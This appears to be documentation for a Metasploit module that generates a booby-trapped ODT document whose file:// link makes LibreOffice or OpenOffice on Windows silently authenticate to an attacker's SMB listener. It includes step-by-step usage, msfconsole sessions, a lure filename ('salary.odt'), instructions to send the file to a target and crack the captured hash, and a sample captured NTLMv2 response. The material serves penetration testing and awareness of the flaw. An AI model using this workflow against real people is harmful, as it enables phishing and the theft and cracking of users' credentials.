BADODT Module creates an ODT file which includes a file:// link which points back to a listening SMB capture server.
This module has been tested on both LibreOffice 6.03 /Apache OpenOffice 4.1.5 and upon opening connects to the server
without providing any warning to the user. This allows an attacker the opportunity to potentially steal NetNTLM hashes.

## Vulnerable Application

 - [LibreOffice 6.03](https://www.libreoffice.org/download/download/)
 - [Apache OpenOffice 4.1.5](https://sourceforge.net/projects/openofficeorg.mirror/files/4.1.5/binaries/en-US/Apache_OpenOffice_4.1.5_Win_x86_install_en-US.exe/download)

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/fileformat/odt_badodt```
  4. Customise Options as required
  5. Do: ```run```
  6. A malicious document will then be generated.
  7. Configure auxiliary/server/capture/smb or similar to capture hashes.
  8. Send document to target and wait for them to open.

## Options

**CREATOR**

This option allows you to customise the document author for the new document:
```
set CREATOR New_User
```

**FILENAME**

This option allows you to customise the generated filename:
```
set FILENAME salary.odt
```

**LHOST**

This option allows you to set the IP address of the SMB Listener that the .odt document points to:

```
set LISTENER 192.168.1.25
```

## Scenarios

Install LibreOffice 6.03 or Apache OpenOffice 4.1.5 on a Windows workstation.  (Note: This attack does not work against Mac or Linux versions.)

  ```
  msf5 > use auxiliary/fileformat/odt_badodt 
  msf5 auxiliary(fileformat/odt_badodt) > set FILENAME salary.odt
  FILENAME => salary.odt
  msf5 auxiliary(fileformat/odt_badodt) > set LHOST 192.168.1.25
  LHOST => 192.168.1.25
  msf5 auxiliary(fileformat/odt_badodt) > set CREATOR A_USER
  CREATOR => A_USER
  msf5 auxiliary(fileformat/odt_badodt) > exploit

  [*] Generating Malicious ODT File 
  [*] SMB Listener Address will be set to 192.168.1.25
  [+] salary.odt stored at /root/.msf4/local/salary.odt
  [*] Auxiliary module execution completed
  msf auxiliary(fileformat/odt_badodt) > 
  ```

On an attacker workstation, use a tool to serve and capture an SMB share on port 445, capturing NTLM hashes.  Note that any tool listening on :445 will require superuser permissions:

  ```
  $ sudo ./msfconsole
  msf5 > use auxiliary/server/capture/smb 
  msf5 auxiliary(server/capture/smb) > run
  [*] Auxiliary module running as background job 0.
  msf5 auxiliary(server/capture/smb) >
  [*] Server started.

  msf5 auxiliary(server/capture/smb) >
  ```

Leave the metasploit SMB server listening while the user opens the document.  Upon opening the ODT file, the user workstation will attempt to connect (and authenticate) to the attacker workstation:

  ```
  [*] SMB Captured - 2018-06-06 11:14:23 -0500
  NTLMv2 Response Captured from 192.168.108.171:49180 - 192.168.108.171
  USER:asoto-r7 DOMAIN:WIN-TSD7B7BQKDQ OS: LM:
  LMHASH:Disabled
  LM_CLIENT_CHALLENGE:Disabled
  NTHASH:3910d841a30289ad9876e09321c1099a
  NT_CLIENT_CHALLENGE:0101000000000000a9d923e9f909391957581abc8d91038400000000020000000000000000000000
  ```

Finally, crack the hash to capture the user's credentials.
